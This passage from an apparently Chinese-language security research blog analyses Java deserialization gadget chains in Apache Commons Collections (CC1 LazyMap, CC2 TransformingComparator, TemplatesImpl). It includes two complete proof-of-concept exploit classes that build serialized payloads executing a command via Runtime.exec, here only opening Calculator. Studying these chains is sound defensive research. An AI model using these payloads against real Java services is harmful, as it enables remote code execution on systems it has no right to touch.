src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205526861.png" alt="image-20210513205526861"></p><p>可以看出，实现了对collection的迭代器和parent的操作</p><p>跟进去看EntrySetIterator的实现：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205918283.png" alt="image-20210513205918283"></p><p>返回一个迭代器就是var4，是。</p><p>接下来，var5=var4.next()</p><p>跟进去next方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210302272.png" alt="image-20210513210302272"></p><p>好家伙，直接返回了一个MapEntry,entry是entry，parent一直都是TransformedMap outMap</p><p>这下终于理清了，是cc直接搞得鬼。</p><p>var5就是AbstractInputCheckedMapDecorator$MapEntry类</p><p>接下来之后对var5进行setValue调用，由于var5是AbstractInputCheckedMapDecorator$MapEntry对象，所以会执行自己的setValue方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210604593.png" alt="image-20210513210604593"></p><p>由于这里parent一直是TransformedMap对象outMap，所以调用的是TransformedMap的checkSetValue方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210818971.png" alt="image-20210513210818971"></p><p>可以看到，这时候outMap一直帮我们存着的chain原来放在了valueTransformer的属性里，也就自然会被执行了。</p><p>接下来就是熟悉的情节了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513211012291.png" alt="image-20210513211012291"></p><p>触发。</p><h3 id="LazyMap版本"><a href="#LazyMap版本" class="headerlink" title="LazyMap版本"></a>LazyMap版本</h3><p>LazyMap也调用了transform方法。</p><h4 id="利用链寻找-1"><a href="#利用链寻找-1" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>对Transformer接口中的transform方法find usage：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111502143.png" alt="image-20210513111502143"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111521568.png" alt="image-20210513111521568"></p><p>get方法首先判断map中是否已有该key，如果不存在，最终会到factory.transform进行处理。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111833377.png" alt="image-20210513111833377" style="zoom:80%;"><p>能发现decorate方法可以new一个LazyMap方法，如果factory可控，就很有搞头了。</p><p>接下来要找找哪些方法会调用LazyMap的get方法(最好是readObject内部会用到，最契合的条件，可惜没有)</p><p>坑点记录：<a href="https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/">记一次对线rt.jar</a></p><p>发现AnnotationInvocationHandler内部的invoke调用了get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513153931088.png" alt="image-20210513153931088"></p><p>我们可以发现在这个类中，memberValues是Map对象，并且有对map的get操作。</p><p>LazyMap也是Map的子类，重写了get方法，所以这里如果memberValues是LazyMap类对象，会成功调用LazyMap的get方法，就可以触发漏洞。</p><p>所以如何触发这个invoke函数呢？</p><h4 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h4><p>需要依赖动态代理，参考<a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">之前的博客</a>：</p><p><strong>总结就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法。</strong></p><p>写个小例子好理解：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513160306511.png" alt="image-20210513160306511"></p><p>目前已有条件：</p><ul><li>AnnotationInvocationHandler的readObject方法可以触发setValue，</li><li>cc里面很多Map的setValue方法可以调用transform方法</li><li>LazyMap的invoke可以调用Map.get方法，LazyMap重写的get方法可以触发transform方法</li><li>ChainedTransformer的transform方法可以将里面InvokerTransformer的内容进行成环invoke触发</li></ul><p>这个感觉就像：</p><p>handler是一个InvocationHandler类对象，他内部有invoke方法</p><p>我们可以做一个代理类a，让这个代理类代理LazyMap对象,handler也参与，负责invoke</p><p>这样的话，无论以后a调用了LazyMap内部的任何方法，他都会先走一遍handler的invoke方法。</p><p>注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”，handler的<strong>invoke方法</strong>，<strong>就是LazyMap的invoke方法</strong>。</p><p>抱着这个目标，我们还可以发现:</p><ul><li>AnnotationInvocationHandler继承了InvocationHandler，它也可以当动态代理，也可以作为handler</li></ul><p>所以我们可以：</p><ul><li>先拿到AnnotationInvocationHandler的构造函数cons</li><li>先用cons做一个AnnotationInvocationHandler的实例h1，h1的memberValues属性是一个LazyMap(包装好innermap和chain)</li><li>再用h1参与Proxy.newProxyInstance，去做一个LazyMap的代理实例mapProxy</li><li>再用cons去做一个AnnotationInvocationHandler的实例h2，h2的memberValues属性是mapProxy</li></ul><p>这时候h2作为payload，参与序列化操作。</p><p>我们主要关注反序列化：</p><p>断点下到第一个readObject位置，java.io.ObjectInputStream#readSerialData：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513170527485.png" alt="image-20210513170527485"></p><p>slots数组里面的内容就是h2，可以看到类型是AnnotationInvocationHandler</p><p>接下来会走到java.io.ObjectInputStream#invoke方法，可以看到ma=readObject，obj=h2</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171248714.png" alt="image-20210513171248714"></p><p>先在AnnotationInvocationHandler.readObject下断点，然后over-step:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171910871.png" alt="image-20210513171910871"></p><p>果然进入到readObject方法，理论上现在this.memberValues就是我们传进来的mapProxy参数。</p><p>mapProxy是一个动态代理，它代理了LazyMap这个类，handler是h1。</p><p>那么这里一但mapProxy调用了任何方法，都会走handler(h1)的invoke方法，<strong>this.memberValues.entrySet()就是一次调用</strong></p><p>这里可以先在AnnotationInvocationHandler类的invoke处下一个断点，然后step-over：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182135950.png" alt="image-20210513182135950"></p><p>这里继续往下看，发现AnnotationInvocationHandler类的invoke调用了this.memberValues.get()：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182402111.png" alt="image-20210513182402111"></p><p>这会再一次触发h1的invoke函数，并且现在this.memberValues的值为h1的参数，类型是LazyMap，factory就是lazymap属性，就是我们传进去的chain，的那么就会进入LazyMap.get方法：</p><p>LazyMap.get内部就会有transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513183528337.png" alt="image-20210513183528337"></p><p>如果当前factory是我们的chain，那就会触发RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject() -&gt; </span><br><span class="line">  AnnotationInvocationHandler.readObject() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt;</span><br><span class="line">  AnnotationInvocationHandler.invoke() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; </span><br><span class="line">  ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; </span><br><span class="line">  RCE</span><br></pre></td></tr></table></figure><h4 id="最终版本PoC-1"><a href="#最终版本PoC-1" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_LazyMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建携带着LazyMap的AnnotationInvocationHandler实例h1</span></span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h2><p>条件：</p><ul><li><strong>commons-collections4: 4.0</strong></li><li>jdk1.7 1.8低版本</li></ul><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预备知识：</p><p><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">javassist</a></p><p><a href="https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/">JVM类加载机制</a></p><h3 id="利用链寻找-2"><a href="#利用链寻找-2" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>第一件事依然是寻找readObject复写点，这次盯上的是jdk的<strong>PriorityQueue</strong>：</p><blockquote><p>PriorityQueue 优先级队列是基于优先级堆的一种特殊队列 , 它满足队列 “ 队尾进 , 队头出 “ 的特点 </p><p><strong>队列中每次插入或删除元素时 , 都会调用 Comparator 方法对队列进行调整</strong> </p><p><strong>缺省情况下 , 优先级队列会根据自然顺序对元素进行排序 , 形成一个最小堆( 父节点的键值总是小于或等于任何一个子节点的键值 ) . 当指定了Comparator后 , 优先级队列会根据Comparator的定义对元素进行排序.</strong></p></blockquote><p>梳理了一下PriorityQueue类的流程：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514104821773.png" alt="image-20210514104821773"></p><p>可以看到queue和comparator都是进行了可控性的传递。</p><p>那这里我们继续寻找哪些实现了Comparator接口的类拥有compare方法，目标锁定到<strong>TransformingComparator</strong>：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514120620377.png" alt="image-20210514120620377"></p><p>哦这熟悉的transformer.transform 可控！</p><p>但是他并不像ChainedTransformer一样是成环transform，仅仅调用了一次Comparator.compare。</p><h3 id="TransformingComparator版本"><a href="#TransformingComparator版本" class="headerlink" title="TransformingComparator版本"></a>TransformingComparator版本</h3><h4 id="最终版本PoC-2"><a href="#最终版本PoC-2" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>这里完全可以借助这一点，写一版PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_TransformingComparator_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] raw_payload = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /Applications/Calculator.app"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(raw_payload);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细节</p><ol><li>为什么put了两个值：</li></ol><p>因为在heapify方法实现如下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514110829082.png" alt="image-20210514110829082"></p><p>这里只有size&gt;1才能进入循环。</p><ol start="2"><li>add做了什么事？</li></ol><p>两次add做了什么事，这里要force-step(红色的小箭头)进入</p><p>调用梳理如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add() -&gt; offer() -(第二次才会)-&gt; siftUp() -&gt; siftUpComparable()</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112304003.png" alt="image-20210514112304003"></p><p>第二次：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112556522.png" alt="image-20210514112556522"></p><p>由于我们没有设置comparator，所以会进入else分支：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p><p>siftUpComparable方法只是把元素放到队列里，并没有做什么事：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514113611190.png" alt="image-20210514113611190"></p><ol start="3"><li>为什么还反射来构造函数来修改值？</li></ol><p>因为为了可以满足赋值，需要让comparator属性为null，才能继续走：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p><p>当我们再次反射，是为了可以在之后的readObject里面使用comparator属性来调用compare方法，我们需要给他赋值恶意chain。</p><h4 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h4><ol><li>payload：PriorityQueue（2，TransformingComparator(transformer = chain)）</li><li>对于PriorityQueue来说，他的comparator就是TransformingComparator(transformer = chain)这一串东西。</li><li>首先肯定是进入PriorityQueue的readObject方法，一路走。</li><li>之后重点在PriorityQueue的siftDown方法中，会校验comparator是否为null，显然不是，进入siftDownUsingComparator方法。</li><li>之后在siftDownUsingComparator进行了comparator.compare，下图显示</li><li>由于comparator是TransformingComparator类对象，所以进入TransformingComparator的compare方法</li><li>这时TransformingComparator对象的this.transformer属性就是chain，chain.transform成环调用，触发。</li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122321048.png" alt="image-20210514122321048"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122515406.png" alt="image-20210514122515406"></p><p>第一个transform就会触发。</p><h3 id="TemplatesImpl版本"><a href="#TemplatesImpl版本" class="headerlink" title="TemplatesImpl版本"></a>TemplatesImpl版本</h3><p>ysoserial用的是这个版本</p><blockquote><p>之前提到过，TransformingComparator的compare内部并不像ChainedTransformer的transform一样是成环transform。</p></blockquote><p>ysoserial把目光聚焦在了TemplatesImpl里面</p><p>TemplatesImpl位于rt.jar下的sun包里面，源码分析：</p><p>TemplatesImpl这个类有两个属性：</p><ul><li>_bytecodes：byte[] 字节码的字节数组</li><li>_class: Class[] 根据 _bytecode 生成的Class对象</li></ul><p>可以看到：</p><p>getTransletInstance</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514132343726.png" alt="image-20210514132343726"></p><p>defineTransletClasses</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115801660.png" alt="image-20210514115801660"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115709993.png" alt="image-20210514115709993"></p><p>我们都知道静态代码块可以在类加载的同时执行，所以我们只要生成一个类，这个类的静态代码块里执行恶意命令。</p><p>所以这里我们就要找，哪里可以调用getTransletInstance方法，</p><p>发现在本类的newTransformer里面调用了getTransletInstance：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133144671.png" alt="image-20210514133144671"></p><p>那哪里调用了newTransformer方法呢？发现在getoutputProperties里调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133248367.png" alt="image-20210514133248367"></p><p>这部分有点乱画个调用图：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514183849675.png" alt="image-20210514183849675"></p><p>所以到目前为止，我们的收获：</p><ol><li>PriorityQueue的readObject可以走到Comparator接口的compare方法</li><li>TransformingComparator是Comparator的实现类，TransformingComparator的transform方法会调用Tranformer接口的transform函数</li><li>另一方面，TransformerImpl的newTransformer的一系列操作可以将_bytecode数组里面的内容加载进虚拟机，获得一个AbstractTranslet类的对象</li><li>创建这个对象的时候，Class类对象里的静态代码块必将被执行</li></ol><p>所以现在的问题就是，如何将一个实现了Tranformer接口的类，他的transform方法和TransformerImpl的newTransformer结合到一起。</p><h4 id="纽带"><a href="#纽带" class="headerlink" title="纽带"></a>纽带</h4><p>我们发现TransformingComparator的构造函数可以将Transformer类放入自身<em>transformer</em>类属性：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514142610125.png" alt="image-20210514142610125"></p><p>隐隐约约感觉能连上！</p><p>ysoserial的思路是将恶意操作放在一个类的静态代码块中，将这个类的bytecode传递给某个可控参数，最终传递给invoke函数命令执行。</p><p>开始构造PoC：</p><p>构造流程:</p><ol><li>首先我们要有一个PriorityQueue对象pq在最外面，作为readObject的入口</li><li>javassist生成一个恶意类，它的静态代码块中有恶意命令，获得这个恶意类的字节数组</li><li>拿到之后如何传递到链中，我们的payload说到底是一个static代码块，最理想的情况就是它被newInstance了，那我们就要找哪些方法可以做到，等等，好像不需要再找了，因为前文提到的TemplatesImpl的_bytecode数组内容在TemplatesImpl的getTransletInstance方法中被defineClass了</li><li>那么，现在问题就来到哪些类可以调用getTransletInstance方法呢？发现正巧的是TemplatesImpl自己的newTransformer就可以调用</li><li>所以现在就来到哪里可以调用newTransformer方法，发现没有，但是我们降维武器反射，这里需要用InvokeTransformer[]来包装一下“newTransformer”</li><li>现在还需要一个TemplatesImpl对象tmpl来帮我们做纽带，并且将这个对象的bytecode属性设置为恶意类，还要保证属性name不为null</li><li>tmpl现在的bytecode属性内容就是恶意类，所以调用tmpl的newTransformer方法就可以了！</li></ol><h4 id="一些细节"><a href="#一些细节" class="headerlink" 